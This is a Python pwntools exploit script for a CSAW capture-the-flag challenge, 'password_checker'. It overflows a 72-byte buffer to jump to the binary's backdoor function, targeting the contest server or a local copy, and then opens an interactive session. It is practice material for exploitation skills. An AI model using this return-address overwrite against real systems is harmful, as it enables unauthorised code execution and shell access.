#!/usr/bin/env python3

from pwn import *

LOCAL = False
context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker'
password_elf = ELF(binary)
context.log_level = 'debug'

back_door = p64(password_elf.symbols.backdoor)
log.info(f"back door sanity check after packing and unpacking @ {hex(u64(back_door))}")
OFFSET = 72
junk = b"A" * OFFSET

if LOCAL == False:
    p = remote('pwn.chal.csaw.io', 5000, ssl=False)
else:
    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker')

payload = [
    junk,
    back_door,
]

payload = b''.join(payload)
p.sendline(payload)

p.interactive()
